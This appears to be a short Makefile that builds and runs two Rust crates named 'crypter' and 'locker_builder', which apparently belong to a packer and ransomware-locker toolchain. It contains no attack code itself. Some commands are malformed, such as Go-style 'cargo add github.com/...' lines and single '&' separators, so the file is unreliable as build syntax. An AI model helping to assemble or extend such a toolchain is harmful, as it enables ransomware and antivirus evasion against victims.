add_deps:
	cd crypter & cargo add rdev

update_rypes:
	cd crypter && cargo add github.com/D0K-ich/rypes
	cd locker_builder && cargo add github.com/D0K-ich/rypes

rc:
	cd crypter & cargo run

rl:
	cd locker_builder & cargo run

bc:
	cd crypter & cargo build

bcs:
	cd crypter & cargo build --release

bcd:
	cd crypter & set RUSTFLAGS=-C target-feature=+crt-static && cargo build --release

bss:
	cd locker_builder & cargo build --release

cd:
	objdump -p client/target/release/client.exe | Select-String DLL